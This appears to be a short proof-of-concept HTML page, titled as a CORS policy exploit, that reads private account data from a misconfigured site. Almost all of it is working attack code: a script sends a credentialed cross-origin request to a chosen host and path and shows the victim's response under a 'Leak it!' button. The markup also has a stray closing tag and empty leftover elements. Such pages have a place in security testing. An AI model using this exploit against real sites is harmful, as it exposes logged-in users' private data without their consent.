
<!DOCTYPE html>
<html>
<body>
<h1>Cors Policy exploit by kunal</h1>
<input id="host" size="30" type="text" value="https://cors-misconfigured-website" />
<input id="path" size="30" type="text" value="/some-private-account-info" />
<button onclick="corstest()">Leak it!</button>
<textarea id="corsleak" readonly="" rows="10" style="width: 99%;"></textarea>
<script>
  function corstest() {
    document.getElementById('corsleak').value = "";
    var req = new XMLHttpRequest();
    req.onload = listener;
    req.open('GET', document.getElementById('host').value + document.getElementById('path').value);
    req.withCredentials = true;
    req.send();
    function listener() {
      document.getElementById('corsleak').value = this.responseText;
    }
}
</script>
</body>
</noscript>
<div style="text-align: center;"><div style="position:relative; top:0; margin-right:auto;margin-left:auto; z-index:99999">

</div></div>
</html>
